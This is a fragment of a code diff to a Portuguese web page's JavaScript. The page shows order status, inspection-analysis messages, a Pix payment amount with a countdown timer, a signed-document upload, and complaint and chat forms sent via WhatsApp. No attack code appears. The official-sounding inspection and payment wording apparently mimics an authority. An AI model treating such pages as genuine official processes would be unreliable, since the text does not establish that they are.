+                    <p style="font-size:0.85rem; color:#64748b; font-weight:800; margin-bottom:10px; border-top: 1px solid #eee; padding-top: 15px;">PASSO FINAL OBRIGATÓRIO:</p>
+                    <p style="font-size:0.9rem; margin-bottom:15px; color:#333;">Imprima, assine o documento e anexe-o clicando no botão abaixo.</p>
+                    <label for="upload-assinado" class="btn-success" style="cursor:pointer; display:flex; font-size: 1rem; padding: 16px; background: #1a73e8; border-radius: 8px; color: white; justify-content: center; gap: 10px;">
+                      <i class="fas fa-envelope"></i> Enviar Documento Assinado
+                    </label>
+                    <input type="file" id="upload-assinado" style="display:none;" accept="application/pdf, image/*" onchange="window.enviarAssinaturaEmail()">
+                  </div>
+                `;
+                window.atualizarBarraProgresso(4); 
+              } 
+              else if (pedido.valor === null || pedido.valor === "") {
+                divPix.style.display = 'none'; divMsg.style.display = 'block';
+                divMsg.style.background = '#fffbeb'; divMsg.style.color = '#b45309'; divMsg.style.borderColor = '#f59e0b';
+                textMsg.innerHTML = '<i class="fas fa-search-location" style="font-size:1.5rem; margin-bottom: 10px;"></i><br><strong>Análise em Andamento</strong><br>Sua documentação está sendo analisada pelos fiscais de plantão. Volte a consultar em alguns instantes.';
+                window.atualizarBarraProgresso(2); 
+              } 
+              else {
+                divMsg.style.display = 'none'; divPix.style.display = 'block';
+                let valorFormatado = parseFloat(pedido.valor).toLocaleString('pt-BR', {style: 'currency', currency: 'BRL'});
+                if(valorFormatado === "NaN" || !pedido.valor.match(/[0-9]/)) valorFormatado = "R$ " + pedido.valor;
+                document.getElementById('valor-cobrado').innerText = valorFormatado;
+                cnpjParaComprovante = cnpj;
+                
+                window.atualizarBarraProgresso(3); 
+                window.iniciarCronometroPix(); 
+              }
+            }
+        });
       });
-
-      // Submit do Formulário de Denúncia
+  
       document.getElementById('form-denuncia').addEventListener('submit', (e) => {
         e.preventDefault();
         let assunto = document.getElementById('assunto').value;
@@ -1475,10 +1479,9 @@
         const local = document.getElementById('local').value;
         const relato = document.getElementById('relato').value;
         const msg = "DENUNCIA SIGILOSA OFICIAL\n\nMOTIVO: " + assunto + "\nLOCAL: " + local + "\nRELATO: " + relato;
-        enviarWhatsApp(msg);
+        window.enviarWhatsApp(msg);
       });
-
-      // Submit do Chatbot
+  
       document.getElementById('chat-form').addEventListener('submit', (e) => {
         e.preventDefault();
         const txt = document.getElementById('chat-msg');
@@ -1492,7 +1495,7 @@
           body.scrollTop = body.scrollHeight;
         }, 1000);
       });
-
+  
     });
   </script>
 </body>
